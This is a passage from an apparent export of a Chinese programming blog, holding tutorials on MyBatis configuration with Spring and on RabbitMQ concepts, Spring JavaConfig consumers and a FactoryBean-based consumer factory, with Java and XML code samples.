&lt;value&gt;classpath*:jdbc.properties&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\" init-method=\"init\" destroy-method=\"close\"&gt; &lt;property name=\"driverClassName\" value=\"${driver}\"/&gt; &lt;property name=\"url\" value=\"${url}\"/&gt; &lt;property name=\"username\" value=\"${username}\"/&gt; &lt;property name=\"password\" value=\"${password}\"/&gt; &lt;property name=\"filters\" value=\"stat\"/&gt; &lt;property name=\"maxActive\" value=\"20\"/&gt; &lt;property name=\"initialSize\" value=\"1\"/&gt; &lt;property name=\"maxWait\" value=\"60000\"/&gt; &lt;property name=\"minIdle\" value=\"1\"/&gt; &lt;property name=\"timeBetweenEvictionRunsMillis\" value=\"60000\"/&gt; &lt;property name=\"minEvictableIdleTimeMillis\" value=\"300000\"/&gt; &lt;property name=\"validationQuery\" value=\"SELECT 'x'\"/&gt; &lt;property name=\"testWhileIdle\" value=\"true\"/&gt; &lt;property name=\"testOnBorrow\" value=\"false\"/&gt; &lt;property name=\"testOnReturn\" value=\"false\"/&gt; &lt;property name=\"poolPreparedStatements\" value=\"true\"/&gt; &lt;property name=\"maxPoolPreparedStatementPerConnectionSize\" value=\"50\"/&gt; &lt;/bean&gt; &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;!-- 指定mapper文件 --&gt; &lt;property name=\"mapperLocations\" value=\"classpath*:mapper/*.xml\"/&gt; &lt;/bean&gt; &lt;!-- 指定扫描dao --&gt; &lt;bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt; &lt;property name=\"basePackage\" value=\"com.git.hui.demo.mybatis\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 注意上面的三个bean，一个dataSource, 主要配置一些db链接相关的参数，一个sqlSessionFactory, 属于bean工厂，用于创建一些Sql会话，里面一个非常重要的参数就是指定 mapperLocations 最终一个就是指定扫描dao的路径，这个不能忘，否则会发现无法注入dao II. 一个实例以一个实际的例子，演示dao与mapper文件的映射关系，以及调用姿势，首先定义DB实体类对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@Datapublic class PoetryEntity implements Serializable { private static final long serialVersionUID = 4888857290009801223L; private Long id; /** * 作者名 */ private String author; /** * 标题 */ private String title; /** * 内容 */ private String content; /** * 解释 */ private String explain; /** * 诗词的类型 0 成语，1 唐前诗词 */ private Integer type; /** * 标记，对应诗词的朝代 */ private Integer tag; /** * 诗词的题材，七言，五言等 */ private String theme; private Integer isDeleted; private Integer created; private Integer updated;} dao文件 1234public interface PoetryDao { PoetryEntity queryPoetryById(@Param(\"id\") Long id);} 对应的xml文件 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;&lt;mapper namespace=\"com.git.hui.demo.mybatis.mapper.PoetryDao\"&gt; &lt;sql id=\"poetryEntity\"&gt; id, title, author, content, `explain`, `type`, `tag`, `theme`, `is_deleted` as isDeleted, UNIX_TIMESTAMP(`created_at`) as created, UNIX_TIMESTAMP(`updated_at`) as updated &lt;/sql&gt; &lt;select id=\"queryPoetryById\" parameterType=\"long\" resultType=\"com.git.hui.demo.mybatis.entity.PoetryEntity\"&gt; select &lt;include refid=\"poetryEntity\"/&gt; from poetry where id=#{id} &lt;/select&gt;&lt;/mapper&gt; 测试case 1234567891011121314@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(\"classpath*:spring/*.xml\")public class PoetryDaoTest { @Autowired private PoetryDao poetryDao; @Test public void testGet() { PoetryEntity entity = poetryDao.queryPoetryById(3L); System.out.println(\"query result: {}\" + entity); }} 看到上面自然就有一个疑问，定义的Dao接口，是如何和xml文件关联起来的呢？ 注意xml中的namespace，为dao的全限定名 注意xml中的sql标签中的id，与dao层定义的接口名完全一致 大胆的猜测一下，整个过程应该如下： mybatis通过前面配置文件指定的mapperLocations，扫描指定路径下的所有xml文件（即写sql逻辑的xml） MapperScannerConfigurer 这个bean定义了哪些属于Dao层接口 对所有的dao接口，根据动态代理的方式，生成一个Proxy类，由这个proxy类，将dao接口的方法与xml中定义的sql标签关联起来 dao接口的访问，实际由代理类执行，将xml定义的规则映射为对应的sql，然后交由底层封装好的jdbc来执行 实际上大致流程也是这样，从上面的描述，一个问题很容易抛出 dao层接口，不支持重载（因为会导致dao层接口与xml中的关联不上的问题） III. 其他项目工程 study-demo 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/11/Mybatis框架学习之使用篇一：基本环境/"},{"title":"RabbitMQ基础教程之Spring&JavaConfig&FactoryBean使用姿势","text":"RabbitMQ基础教程之Spring使用篇相关博文，推荐查看: RabbitMq基础教程之安装与测试 RabbitMq基础教程之基本概念 RabbitMQ基础教程之基本使用篇 RabbitMQ基础教程之使用进阶篇 RabbitMQ基础教程之Spring&amp;JavaConfig使用篇 在前面的一篇演示了如何使用Spring来进行RabbitMQ的消息投递和消费，虽然可以实现基本的需求场景，但是使用起来却并不是特别顺手，首先是不同的消费者，得添加好多不同的配置项，加上有较多的配置（QueueName, ExchangeName, RoutingKey, autoAck…) 那么有没有可能借助工厂方式，来简化消费者这边的大多数配置呢？ I. 工厂类定义消费者信息目标比较清晰了，我们希望有一个工厂类，可以承载所有的关心的配置信息，然后在实际使用的地方，通过这个工厂类生成一个Consumer即可 1. 消费接口定义首先需要定义一个公共的消费者接口，主要用来接收并处理消息 1234567public interface IMqConsumer extends ChannelAwareMessageListener { void setContainer(SimpleMessageListenerContainer container); default void shutdown() {}} 对于ChannelAwareMessageListener前面就以及用到，当有消息后，触发的监听器，这里我们增加了两个方法，其实主要就是干一件事情，优雅的关闭消费 当应用需要停止或者重启时，我们希望先优雅的关闭消息消费，那么就会用到 org.springframework.amqp.rabbit.listener.AbstractMessageListenerContainer#stop() 因此针对这个功能，可以实现一个公共的抽象类 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class AbsMQConsumer implements IMqConsumer { private volatile boolean end = false; private SimpleMessageListenerContainer container; private boolean autoAck; public void setContainer(SimpleMessageListenerContainer container) { this.container = container; autoAck = container.getAcknowledgeMode().isAutoAck(); } public void shutdown() { end = true; } protected void autoAck(Message message, Channel channel, boolean success) throws IOException { if (autoAck) { return; } if (success) { channel.basicAck(message.getMessageProperties().getDeliveryTag(), false); } else { channel.basicNack(message.getMessageProperties().getDeliveryTag(), false, true); } } public void onMessage(Message message, Channel channel) throws Exception { try { autoAck(message, channel, process(message, channel)); } catch (Exception e) { autoAck(message, channel, false); throw e; } finally { if (end) { container.stop(); } } } public abstract boolean process(Message message, Channel channel);} 上面的实现中，前面两个方法比较清晰，没有什么二意，需要关注的是onMessage方法的实现，我们默认封装了ack的逻辑，设计思路如下： 当开启了手动ack之后，要求实际消费方实现 process 方法，并返回boolean，表示是否消费成功 消费成功，则ack 消费失败，则将消息重新丢回到队列 若开启自动ack，则不需要关注 每次消费一条消息之后，需要关注下是否关闭这个状态，从而实现mq的停止消费 所以每个实际消费者，实现这个抽象类的 process 方法即可，在内部实现自己的消息消费逻辑 2. 工厂类前面主要定义了消费的实体可以怎么玩，接下来就是重头戏了，如何声明队列，如何绑定交换器等，如何注册消息监听器（即上面的Consumer)？ 根据前面的实现，我们需要关注的几个参数依然是下面几个: 123456789101112private String exchange;private String queue;private String routingKey;private Boolean autoDeleted;private Boolean durable;private Boolean autoAck;private ConnectionFactory connectionFactory;private RabbitAdmin rabbitAdmin; 我们最终的目标就是给每个Consumer创建一个SimpleMessageListenerContainer的Bean交给Spring来托管，所以可以利用Spring的FactoryBean来实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106@Data@Builderpublic class MQContainerFactory implements FactoryBean&lt;SimpleMessageListenerContainer&gt; { private ExchangeType exchangeType; private String directExchange; private String topicExchange; private String fanoutExchange; private String queue; private String routingKey; private Boolean autoDeleted; private Boolean durable; private Boolean autoAck; // 并发数 private Integer concurrentNum; private ConnectionFactory connectionFactory; private RabbitAdmin rabbitAdmin; // 消费方 private IMqConsumer consumer; private Exchange buildExchange() { if (directExchange != null) { exchangeType = ExchangeType.DIRECT; return new DirectExchange(directExchange); } else if (topicExchange != null) { exchangeType = ExchangeType.TOPIC; return new TopicExchange(topicExchange); } else if (fanoutExchange != null) { exchangeType = ExchangeType.FANOUT; return new FanoutExchange(fanoutExchange); } else { if (StringUtils.isEmpty(routingKey)) { throw new IllegalArgumentException(\"defaultExchange's routingKey should not be null!\"); } exchangeType = ExchangeType.DEFAULT; return new DirectExchange(\"\"); } } private Queue buildQueue() { if (StringUtils.isEmpty(queue)) { throw new IllegalArgumentException(\"queue name should not be null!\"); } return new Queue(queue, durable == null ? false : durable, false, autoDeleted == null ? true : autoDeleted); } private Binding bind(Queue queue, Exchange exchange) { return exchangeType.binding(queue, exchange, routingKey); } private void check() { if (rabbitAdmin == null || connectionFactory == null) { throw new IllegalArgumentException(\"rabbitAdmin and connectionFactory should not be null!\"); } if (consumer == null) { throw new IllegalArgumentException(\"rabbit msg consumer should not be null!\"); } } @Override public SimpleMessageListenerContainer getObject() throws Exception { check(); Queue queue = buildQueue(); Exchange exchange = buildExchange(); Binding binding = bind(queue, exchange); rabbitAdmin.declareQueue(queue); rabbitAdmin.declareExchange(exchange); rabbitAdmin.declareBinding(binding); SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(); container.setRabbitAdmin(rabbitAdmin); container.setConnectionFactory(connectionFactory); container.setQueues(queue); container.setPrefetchCount(20); // 这里表示支持Consumer并发消费 container.setConcurrentConsumers(concurrentNum == null ? 1 : concurrentNum); container.setAcknowledgeMode(autoAck ? AcknowledgeMode.AUTO : AcknowledgeMode.MANUAL); container.setMessageListener(consumer); consumer.setContainer(container); return container; } @Override public Class&lt;?&gt; getObjectType() { return SimpleMessageListenerContainer.class; }} 具体的实现代码如上，接下来进行分块分析，首先是Exchange, 我们直到常用的有三种 Exchange： DirectExchange TopicExchange FanoutExchange 因此，我们自定义了一个枚举，来实现不同的Exchange的绑定姿势，注意下面的实现姿势，利用了抽象类的思路 1234567891011121314151617181920212223242526public enum ExchangeType { DIRECT { @Override public Binding binding(Queue queue, Exchange exchange, String routingKey) { return BindingBuilder.bind(queue).to((DirectExchange) exchange).with(routingKey); } }, TOPIC { @Override public Binding binding(Queue queue, Exchange exchange, String routingKey) { return BindingBuilder.bind(queue).to((TopicExchange) exchange).with(routingKey); } }, FANOUT { @Override public Binding binding(Queue queue, Exchange exchange, String routingKey) { return BindingBuilder.bind(queue).to((FanoutExchange) exchange); } }, DEFAULT { @Override public Binding binding(Queue queue, Exchange exchange, String routingKey) { // 对于Default而言，只能讲消息路由到名完全一直的queue上 return BindingBuilder.bind(queue).to((DirectExchange) exchange).with(queue.getName()); } }; public abstract Binding binding(Queue queue, Exchange exchange, String routingKey);} 剩下的就是 com.git.hui.rabbit.spring.component.MQContainerFactory#getObject 的逻辑了，基本上和前面的思路一样 定义queue 定义exchange 创建绑定 创建SimpleMessageListenerContainer，设置各种参数 3. 配置类不可避免的需要一些配置，如何RabbitMQ的连接工厂，RabbitAmdin，这些是可以作为多个Consumer的公共Bean来使用的，因此就放在了配置类中 12345678910111213141516171819@Configurationpublic class FacSpringConfig { @Bean public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); factory.setVirtualHost(\"/\"); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); }} II. 测试验证从代码实现角度来看，就几个类，还是比较简单的，接下来就看实际使用的姿势，是不是变简单了 新建一个消费类 12345678public class FacMQConsumer extends AbsMQConsumer { @Override public boolean process(Message message, Channel channel) { String data = new String(message.getBody()); System.out.println(\" fac mq consumer: \" + data); return true; }} 然后定义这个消费类的配置信息，主要是两个Bean的定义，一个是定义上面的FactoryBean，内部通过Builder模式设置了各种参数（借助lombok实现)；另外一个就是获取SimpleMessageListenerContainer容器了 12345678910111213@Beanpublic MQContainerFactory mqContainerFactory(ConnectionFactory connectionFactory, RabbitAdmin rabbitAdmin) { return MQContainerFactory.builder().queue(\"fac.direct\").directExchange(\"fac.direct.exchange\").durable(true) .autoDeleted(false).autoAck(false).connectionFactory(connectionFactory).rabbitAdmin(rabbitAdmin) .routingKey(\"fac-routing\").consumer(new FacMQConsumer()).build();}@Beanpublic SimpleMessageListenerContainer facContainer(ConnectionFactory connectionFactory, RabbitAdmin rabbitAdmin) throws Exception { MQContainerFactory fac = mqContainerFactory(connectionFactory, rabbitAdmin); return fac.getObject();} 对应的测试类可以如下实现 12345678910111213141516171819@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = FacSpringConfig.class)public class FactoryComponentUnit { @Autowired private AmqpProducer amqpProducer; @Test public void testDirectConsumer() throws InterruptedException { String[] routingKey = new String[]{\"hello.world\", \"fac-routing\", \"test1\"}; for (int i = 0; i &lt; 10; i++) { amqpProducer.publishMsg(\"fac.direct.exchange\", routingKey[i % 3], \"&gt;&gt;&gt; hello \" + routingKey[i % 3] + \"&gt;&gt;&gt; \" + i); } System.out.println(\"-------over---------\"); Thread.sleep(1000 * 60 * 10); }} 然后就可以愉快的玩耍了 III. 其他项目地址 六月/study-demo 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/04/RabbitMQ基础教程之Spring-JavaConfig-FactoryBean使用姿势/"},{"title":"RabbitMq基础教程之基本概念","text":"RabbitMq基础教程之基本概念RabbitMQ是一个消息队列，和Kafka以及阿里的ActiveMQ从属性来讲，干的都是一回事。消息队列的主要目的实现消息的生产者和消费者之间的解耦，支持多应用之间的异步协调工作 由于工作原因，接触和使用rabbitmq作为生产环境下的消息队列，因此准备写一些博文，记录下这个过程中的收货；而开篇除了环境搭建之外，就是对于其内部的基本概念进行熟悉和了解了。 基础环境搭建可以参考： 《RabbitMq基础教程之安装与测试》 本文则主要集中在以下几点： 几个基本概念（Message, Publisher, Exchange, Binding, Queue, Channel, Consuer, Virtual host) 消息分发的几种策略 ACK是什么鬼 I. 基本概念1. 消息队列首先来一张消息队列的经典图，可以划分为三个角色: Producer, Queue, Consumer Queue：为承载消息的容器，为什么是队列而不是栈呢？主要是因为绝大部分的场景，我们都是希望消息是先进先出，有顺序的 Producer：生产者，就是产生消息，并不断往队列塞的角色 Consumer：消费者，也就是不断从队列中获取消息的角色 看到这个模型，如果对JDK的容器有一定的了解，很容易可以想到借助 ArrayBlockingQueue 或者 ListBlockingQueue 就可以实现简易的消息队列（也就是我们常说的生产者-消费者模型） 2. 实例理解消息队列其实在生活中，这种模型用得非常多，就比如我们都会接触的网购快递，可以说是一个典型的消息队列的case了： 商家不断的把商品扔给快递公司（注意不是直接将商品给买家），而快递公司则将商品根据地质分发对应的买家 对上面这个过程进行拆解，可以映射扮演的角色 商品：Message，传递的消息，由商家投递给快递公司时，需要进行打包（一般Producer生产消息也会将实体数据进行封装） 商家：Produer 生产者 快递公司： Queue，消息的载体 买家：Consumer 消费者 那么快递公司时怎么知道要把商品给对应的买家呢？根据包裹上的地址+电话 同样消息队列也需要一个映射规则，实现Message和Consumer之间的路由 3. RabbitMQ基本概念通过上面的实例对比，发现基本的消息队列定义的元素太少，这里则正好可以看一下RabbitMQ是怎么具体来实现消息队列的 Message：消息，包含消息头（即附属的配置信息）和消息体（即消息的实体内容） Publisher：生产者，向交换机发布消息的主体 Exchange：交换机，用来接收生产者发送的消息并将这些消息路由给服务器中的队列 Binding：绑定，用于给Exchange和Queue建立关系，就是我们熟知的配对的红娘 Queue：消息队列，用来保存消息直到发送给消费者。它是消息的容器，也是消息的终点。一个消息可投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。 Connection：连接 Channel：通道，MQ与外部打交道都是通过Channel来的，发布消息、订阅队列还是接收消息，这些动作都是通过Channel完成；简单来说就是消息通过Channel塞进队列或者流出队列 Consumer：消费者，从消息队列中获取消息的主体 Virtual Host: 虚拟主机，表示一批交换器、消息队列和相关对象。虚拟主机是共享相同的身份认证和加密环境的独立服务器域。每个 vhost 本质上就是一个 mini 版的 RabbitMQ 服务器，拥有自己的队列、交换器、绑定和权限机制。vhost 是 AMQP 概念的基础，必须在连接时指定，RabbitMQ 默认的 vhost 是 / Broker：消息队列服务器实体 上面是一些专业的概念，那么可以怎么映射到前面的快递上呢？ II. Exchange类型生产者，将消息投递给Exchange，然后由Exchange将消息路由到对应的Queue上，供消费者消费，那么这个路由有哪些方式呢？ 1. Direct策略 消息中的路由键（routing key）如果和 Binding 中的 binding key 一致， 交换器就将消息发到对应的队列中 简单来讲，就是路由键与队列名完全匹配 如果一个队列绑定到交换机要求路由键为“dog” 只转发 routing key 标记为“dog”的消息， 不会转发“dog.puppy”，也不会转发“dog.guard”等等 它是完全匹配、单播的模式 举例说明 Exchange和两个队列绑定在一起： Q1的bindingkey是orange Q2的binding key是black和green. 当Producer publish key是orange时, exchange会把它放到Q1上, 如果是black或green就会到Q2上, 其余的Message被丢弃 2. Fanout策略 从上图也可以看出，这种策略，将忽略所谓的routing key,将消息分发到所有绑定的Queue上，更加类似我们理解的广播模式 3. Topic策略 topic 交换器通过模式匹配分配消息的路由键属性，将路由键和某个模式进行匹配，此时队列需要绑定到一个模式上 可以理解为直接策略的进阶版，直接策略是完全精确匹配，而topic则支持正则匹配，满足某类指定规则的（如以xxx开头的路由键），可以键消息分发过去 # 匹配0个或多个单词 * 匹配不多不少一个单词 一个更直观的实例如下 Producer发送消息时需要设置routing_key, Q1 的binding key 是”.orange.“ Q2 是 “..rabbit” 和 “lazy.#”： 产生一个 test.orange.mm 消息，则会路由到Q1；而如果是 test.orange则无法路由到Q1,因为Q1的规则是三个单词，中间一个为orange，不满足这个规则的都无效 产生一个 test.qq.rabbit 或者 lazy.qq 都可以分发到Q2；即路由key为三个单词，最后一个为rabbit或者不限制单词个数，主要第一个是lazy的消息，都可以分发过来 如果产生的是一个 test.orange.rabbit消息，则Q1和Q2都可以满足 4. Headers策略这个实际上用得不多，它是根据Message的一些头部信息来分发过滤Message，忽略routing key的属性，如果Header信息和message消息的头信息相匹配 5. 小结主要使用的消息分发策略有三个，直接，路由和扇形，简单的小结下应用场景和区别 a. Direct Exchange直接完全匹配模式，适用于精准的消息分发 b. Topic ExchangeRouting Key的匹配模式，支持Routing Key的模糊匹配方式，更适用于多类消息的聚合 c. Fanout Exchange忽略Routing Key, 将消息分配给所有的Queue，广播模式，适用于消息的复用场景 III. ACK消息队列的一个重要指标，当有消费者获取了消息之后，对这个消息我应该怎么办？是直接删除还是等某个合适的机会再删除？又或者是干脆不删除，就留着了？ 在实际的应用场景中，消息正常消费之后，我们希望的是这个消息就不要了，但是消费的过程中如果出现了bug，则希望不要删除消息，等我修复这个bug后，可以把这个消息重新的投递给我 1. ack机制Consumer接收到了消息之后，必须返回一个ack的标志，表示消息是否成功消费，如果返回true，则表示消费成功了，然后这个消息就会从RabbitMQ的队列中删掉；如果返回false，且设置为重新入队，则这个消息可以被重新投递进来 通常实际编码中，默认是自动ACK的，如果消息的重要性程度较高，我们应该设置为主动ACK，在接收到消息之后，自主的返回对应的ACK信息 这一块更多地内容可以查看实际使用篇 IV. 其他1. 参考 Consumer Acknowledgements and Publisher Confirms RabbitMQ Tutorials RabbitMQ】三种Exchange模式——订阅、路由、通配符模式 2. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/05/27/RabbitMQ基础教程之基本概念/"},{"title":"RabbitMQ基础教程之Spring&JavaConfig使用篇","text":"RabbitMQ基础教程之Spring使用篇相关博文，推荐查看: RabbitMq基础教程之安装与测试 RabbitMq基础教程之基本概念 RabbitMQ基础教程之基本使用篇 RabbitMQ基础教程之使用进阶篇 在实际的应用场景中，将RabbitMQ和Spring结合起来使用的时候可能更加频繁，网上关于Spring结合的博文中，大多都是xml的方式，这篇博文，则主要介绍下利用JavaConfig的结合，又会是怎样的 I. Spring中RabbitMQ的基本使用姿势1. 准备开始之前，首先添加上必要的依赖，主要利用 spring-rabbit 来实现，这个依赖中，内部又依赖的Spring相关的模块，下面统一改成5.0.4版本 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.16.20&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.amqp&lt;/groupId&gt; &lt;artifactId&gt;spring-rabbit&lt;/artifactId&gt; &lt;version&gt;1.7.3.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.0.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;5.0.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;5.0.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 流程分析 实现主要分为两块，一个是投递服务，一个是消费服务，结合前面RabbitMQ的基本使用姿势中的流程，即便是使用Spring，我们也避免不了下面几步 建立连接 声明Exchange ，声明Queue 建立Queue和Exchange之间的绑定关系 发送消息 消费消息（ack/nak) 2. 基本case首先借助Spring，来实现一个最基本的最简单的实现方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Created by yihui in 19:53 18/5/30. */public class SimpleProducer { public static void main(String[] args) throws InterruptedException { CachingConnectionFactory factory = new CachingConnectionFactory(\"127.0.0.1\", 5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); factory.setVirtualHost(\"/\"); RabbitAdmin admin = new RabbitAdmin(factory); // 创建队列 Queue queue = new Queue(\"hello\", true, false, false, null); admin.declareQueue(queue); //创建topic类型的交换机 TopicExchange exchange = new TopicExchange(\"topic.exchange\"); admin.declareExchange(exchange); //交换机和队列绑定，路由规则为匹配\"foo.\"开头的路由键 admin.declareBinding(BindingBuilder.bind(queue).to(exchange).with(\"foo.*\")); //设置监听 SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(factory); Object listener = new Object() { public void handleMessage(String foo) { System.out.println(\" [x] Received '\" + foo + \"'\"); } }; MessageListenerAdapter adapter = new MessageListenerAdapter(listener); container.setMessageListener(adapter); container.setQueues(queue); container.start(); //发送消息 RabbitTemplate template = new RabbitTemplate(factory); template.convertAndSend(\"topic.exchange\", \"foo.bar\", \"Hello, world!\"); Thread.sleep(1000); // 关闭 container.stop(); }} 3. 逻辑分析上面这一段代码中，包含了消息投递和消费两块，从实现而言，基本上逻辑和前面的基础使用没有什么太大的区别，步骤如下: 建立连接： new CachingConnectionFactory(&quot;127.0.0.1&quot;, 5672) 声明Queue: new Queue(&quot;hello&quot;, true, false, false, null) 声明Exchange: new TopicExchange(&quot;topic.exchange&quot;) 绑定Queue和Exchange: admin.declareBinding(BindingBuilder.bind(queue).to(exchange).with(&quot;foo.*&quot;)); 投递消息： template.convertAndSend(&quot;topic.exchange&quot;, &quot;foo.bar&quot;, &quot;Hello, world!&quot;); 消费消息： 设置MessageListenerAdapter 这里面有几个类需要额外注意： RabbitTemplate: Spring实现的发送消息的模板，可以直接发送消息 SimpleMessageListenerContainer: 注册接收消息的容器 II. Spring结合JavaConfig使用RabbitMQ使用姿势1. 公共配置主要是将公共的ConnectionFactory 和 RabbitAdmin 抽取出来 12345678910111213141516171819202122232425262728@Configuration@ComponentScan(\"com.git.hui.rabbit.spring\")public class SpringConfig { private Environment environment; @Autowired public void setEnvironment(Environment environment) { this.environment = environment; System.out.println(\"then env: \" + environment); } @Bean public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); factory.setVirtualHost(\"/\"); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); }} 2. 消息投递发送消息的组件就比较简单了，直接利用 AmqpTemplate 即可 1234567891011121314151617181920@Componentpublic class AmqpProducer { private AmqpTemplate amqpTemplate; @Autowired public void amqpTemplate(ConnectionFactory connectionFactory) { amqpTemplate = new RabbitTemplate(connectionFactory); } /** * 将消息发送到指定的交换器上 * * @param exchange * @param msg */ public void publishMsg(String exchange, String routingKey, Object msg) { amqpTemplate.convertAndSend(exchange, routingKey, msg); }} 3. DirectExchange消息消费根据不同的Exchange类型，分别实现如下 DirectExchange方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546@Configurationpublic class DirectConsumerConfig { @Autowired private ConnectionFactory connectionFactory; @Autowired private RabbitAdmin rabbitAdmin; @Bean public DirectExchange directExchange() { DirectExchange directExchange = new DirectExchange(\"direct.exchange\"); directExchange.setAdminsThatShouldDeclare(rabbitAdmin); return directExchange; } @Bean public Queue directQueue() { Queue queue = new Queue(\"aaa\"); queue.setAdminsThatShouldDeclare(rabbitAdmin); return queue; } @Bean public Binding directQueueBinding() { Binding binding = BindingBuilder.bind(directQueue()).to(directExchange()).with(\"test1\"); binding.setAdminsThatShouldDeclare(rabbitAdmin); return binding; } @Bean public ChannelAwareMessageListener directConsumer() { return new BasicConsumer(\"direct\"); } @Bean(name = \"directMessageListenerContainer\") public MessageListenerContainer messageListenerContainer() { SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(); container.setConnectionFactory(connectionFactory); container.setRabbitAdmin(rabbitAdmin); container.setQueues(directQueue()); container.setPrefetchCount(20); container.setAcknowledgeMode(AcknowledgeMode.AUTO); container.setMessageListener(directConsumer()); return container; }} 从上面的实现，基本上都是重新定义了一个Queue, Exchange, Binding, MessageListenerContainer（用来监听消息），并将消息的消费抽出了一个公共类 12345678910111213141516171819@Slf4jpublic class BasicConsumer implements ChannelAwareMessageListener { private String name; public BasicConsumer(String name) { this.name = name; } @Override public void onMessage(Message message, Channel channel) throws Exception { try { byte[] bytes = message.getBody(); String data = new String(bytes, \"utf-8\"); System.out.println(name + \" data: \" + data + \" tagId: \" + message.getMessageProperties().getDeliveryTag()); } catch (Exception e) { log.error(\"local cache rabbit mq localQueue error! e: {}\", e); } }} 4. 测试123456789101112131415161718@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = SpringConfig.class)public class SprintUnit { @Autowired private AmqpProducer amqpProducer; @Test public void testDirectConsumer() throws InterruptedException { String[] routingKey = new String[]{\"hello.world\", \"world\", \"test1\"}; for (int i = 0; i &lt; 10; i++) { amqpProducer .publishMsg(\"direct.exchange\", routingKey[i % 3], \"&gt;&gt;&gt; hello \" + routingKey[i % 3] + \"&gt;&gt;&gt; \" + i); } System.out.println(\"-------over---------\"); Thread.sleep(1000 * 60 * 10); }} 这个测试类中，虽然主要是往MQ中投递消息，但在Spring容器启动之后，接收MQ消息并消费的实际任务，是通过前面的MessageListenerContainer托付给Spring容器了，上面测试执行之后，输出为 123direct data: &gt;&gt;&gt; hello test1&gt;&gt;&gt; 2 tagId: 1direct data: &gt;&gt;&gt; hello test1&gt;&gt;&gt; 5 tagId: 2direct data: &gt;&gt;&gt; hello test1&gt;&gt;&gt; 8 tagId: 3 5. Topic &amp; Fanout策略上面的一个写出来之后，再看这两个就比较相似了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546@Configurationpublic class TopicConsumerConfig { @Autowired private ConnectionFactory connectionFactory; @Autowired private RabbitAdmin rabbitAdmin; @Bean public TopicExchange topicExchange() { TopicExchange topicExchange = new TopicExchange(\"topic.exchange\"); topicExchange.setAdminsThatShouldDeclare(rabbitAdmin); return topicExchange; } @Bean public Queue topicQueue() { Queue queue = new Queue(\"bbb\"); queue.setAdminsThatShouldDeclare(rabbitAdmin); return queue; } @Bean public Binding topicQueueBinding() { Binding binding = BindingBuilder.bind(topicQueue()).to(topicExchange()).with(\"*.queue\"); binding.setAdminsThatShouldDeclare(rabbitAdmin); return binding; } @Bean public 